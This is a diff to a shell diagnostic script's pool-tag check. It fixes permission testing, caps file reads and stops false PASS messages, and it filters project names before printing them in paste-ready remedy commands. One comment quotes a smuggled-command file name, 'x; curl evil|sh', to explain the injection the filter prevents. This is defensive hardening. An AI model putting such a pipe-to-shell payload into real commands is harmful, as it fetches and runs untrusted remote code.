@@ -2732,13 +2732,34 @@ _check_pools() {
     _dr_pass pools "no project pools tagged ($dir does not exist) — every project is unconstrained, which is the pre-pools behaviour"
     return 0
   fi
-  # A regular file, a dangling symlink, or a directory nobody may list. ccd
-  # reads the same directory and cannot decide a tag it cannot reach, so this
-  # is a FAIL rather than the absence above.
-  if [ ! -d "$dir" ] || [ ! -r "$dir" ] || [ ! -x "$dir" ]; then
-    _dr_fail pools "pools-unlistable: $dir is not a listable directory, so no project's tag can be read — ccd reads this same path" \
+  # TWO CONDITIONS, NOT ONE (D-1851) — split in fix round 7, because the single test
+  # that stood here FAILED on a box where `ccd` works perfectly. `-r` and `-x`
+  # on a directory are different permissions answering different questions:
+  # SEARCH (`-x`) is all `_project_pool_state` needs, because it stats one
+  # known path (`$POOLS_DIR/<project>`) and never enumerates; LIST (`-r`) is
+  # what THIS check needs and the reader never does. A `pools/` at mode `--x`
+  # therefore has every tag readable by the authority and no tag visible to
+  # the doctor — and the old test called that `pools-unlistable: … so no
+  # project's tag can be read — ccd reads this same path`, which is false in
+  # both halves. A doctor that FAILs a healthy box is the cross-file
+  # disagreement class this wave keeps finding, pointed at itself.
+  #
+  # A regular file, a dangling symlink, or a directory nobody may search: ccd
+  # cannot reach a tag either, and answers `unreadable` for every project.
+  if [ ! -d "$dir" ] || [ ! -x "$dir" ]; then
+    _dr_fail pools "pools-unlistable: $dir is not a searchable directory, so no project's tag can be read — ccd reads this same path and answers unreadable for every project" \
       "fix what is at that path — check with: ls -ld $dir"
     return 1
+  fi
+  # Searchable but not listable: placement is UNAFFECTED and this check is
+  # blind. WARN, and say which of the two it is — a separate class from
+  # `pools-unlistable` because the remedy is the same command but the CLAIM is
+  # the opposite one ("nothing works" vs "everything works, nobody can audit
+  # it"), and `_dr_warn`/`_dr_fail` are not interchangeable printers.
+  if [ ! -r "$dir" ]; then
+    _dr_warn pools "pools-unenumerable: $dir cannot be listed, so this check can audit no tag — but it is searchable, so ccd reads every tag it is given a project name for and placement is unaffected" \
+      "make it listable if you want this check to see it — ls -ld $dir"
+    return 2
   fi
 
   # ONE BUCKET PER REMEDY, this file's standing rule: two conditions cured by
@@ -2823,8 +2844,8 @@ _check_pools() {
     # `warning: command substitution: ignored null byte in input` straight to
     # the operator's stderr — from the PARENT SHELL, so no redirection on the
     # read could have caught it (all measured). The only builtin that can SEE
-    # a NUL is `read -d ''`, whose exit status is 0 iff a delimiter was found
-    # before EOF and 1 at EOF — a free detector, and the one the reader
+    # a NUL is `read -d ''`, whose exit status is 0 iff the read stopped short
+    # of EOF and 1 at EOF — a free detector, and the one the reader
     # already uses. Using it removes the command substitution, so both halves
     # of the defect close in one change, and it stays fork-free (this file's
     # PATH is not guaranteed to carry `cat` — measured under
@@ -2849,8 +2870,16 @@ _check_pools() {
     if [ ! -f "$f" ] || [ ! -r "$f" ]; then
       p_unread+=("$n"); continue
     fi
+    # `-n 64` IS THE READER'S SIZE GATE (D-1850), inherited here for the reason every
+    # other arm in this loop is: a doctor that read a tag differently from the
+    # file that obeys it would report on a rule nobody enforces. Twice the
+    # 32-character grammar, so no legal tag reaches it; an over-cap file stops
+    # short of EOF, returns 0 from this same branch, and is answered
+    # `pools-malformed` — which is what the reader answers too. Without it a
+    # `pools/<p>` symlinked at a growing log is read whole into a variable by
+    # the one tool an operator runs when the box is already sick.
     v=
-    if { IFS= read -r -d '' v; } 2>/dev/null < "$f"; then
+    if { IFS= read -r -d '' -n 64 v; } 2>/dev/null < "$f"; then
       p_malformed+=("$n"); continue
     fi
     v="${v%"${v##*[![:space:]]}"}"
@@ -2887,10 +2916,37 @@ _check_pools() {
     # One `ccd project-pool --project <n> --clear` per stale name, not a single
     # templated sentence — the remedy is the exact command an operator runs,
     # and a `<p>` placeholder left unsubstituted is not a command at all.
-    local -a p_stale_cmds=()
-    for n in "${p_stale[@]}"; do p_stale_cmds+=("ccd project-pool --project $n --clear"); done
+    # AND THE NAME IS FILESYSTEM-DERIVED (D-1852), so it is filtered before it lands
+    # inside a command an operator is invited to paste. Not an escalation —
+    # writing under `$dir` already requires code execution as this user — but
+    # this check's whole value is that what it prints can be trusted, and a
+    # tag file named `x; curl evil|sh` rendered `remedy: clear each: ccd
+    # project-pool --project x; curl evil|sh --clear`. The charset is
+    # `_ws_project_valid`'s own (`ccd:3685`, `^[A-Za-z0-9._-]+$`, no
+    # dot-leading), so no name `ccd` would ever CREATE is omitted — a
+    # cross-file claim, and `pool-name-parity.test.ts` measures it rather than
+    # trusting this sentence. A leading `-` is refused too: it is shell-safe
+    # but would be read by `ccd` as a flag, not as the project.
+    # The MESSAGE above is a different surface and is not filtered: it is
+    # printed, never executed, and `_dr_line` already squashes the newline
+    # that is the only way to forge a second verdict line.
+    local -a p_stale_cmds=(); local p_stale_omit=0
+    for n in "${p_stale[@]}"; do
+      case "$n" in
+        ''|.*|-*|*[!A-Za-z0-9._-]*) p_stale_omit=$((p_stale_omit + 1)); continue ;;
+      esac
+      p_stale_cmds+=("ccd project-pool --project $n --clear")
+    done
+    local p_stale_remedy=""
+    if [ "${#p_stale_cmds[@]}" -gt 0 ]; then
+      p_stale_remedy="clear each: $(_dr_join "${p_stale_cmds[@]}")"
+    fi
+    if [ "$p_stale_omit" -gt 0 ]; then
+      [ -z "$p_stale_remedy" ] || p_stale_remedy+=" — and "
+      p_stale_remedy+="$p_stale_omit name(s) are NOT printed as a command: they hold characters no project name may hold, so the command would not mean what it looks like. Remove those by hand under $dir"
+    fi
     _dr_warn pools "pools-stale: $(_dr_join ${p_stale[@]+"${p_stale[@]}"}) — tagged, but no project directory and no registry row of that name exists, so nothing reads these tags" \
-      "clear each: $(_dr_join "${p_stale_cmds[@]}")"
+      "$p_stale_remedy"
     [ "$rc" -eq 1 ] || rc=2
   fi
   if [ "${#p_orphan[@]}" -gt 0 ]; then
@@ -2904,7 +2960,16 @@ _check_pools() {
     [ "$rc" -eq 1 ] || rc=2
   fi
   if [ "$rc" -ne 0 ]; then return "$rc"; fi
-  _dr_pass pools "every project tag under $dir is one legal pool name, names a project that exists, and names a pool this box's roster carries"
+  # THE PASS SENTENCE SAYS ONLY WHAT RAN (D-1853). `known` empty means the roster
+  # projection could not be read, the orphan arm above made NO claim, and the
+  # old single sentence asserted the third clause ("names a pool this box's
+  # roster carries") anyway — a PASS reporting a check that was skipped, which
+  # is the same false-PASS shape D-1848's own doctor instance was numbered for.
+  if [ -n "$known" ]; then
+    _dr_pass pools "every project tag under $dir is one legal pool name, names a project that exists, and names a pool this box's roster carries"
+  else
+    _dr_pass pools "every project tag under $dir is one legal pool name and names a project that exists — the pool-vocabulary half is UNMEASURED: \$HOME/.ccrc/accounts.sh could not be read, which _check_wrappers reports on its own line"
+  fi
 }
 
 # ── graphify: the AST-graph sweep's engine, skills, excludes, census, and
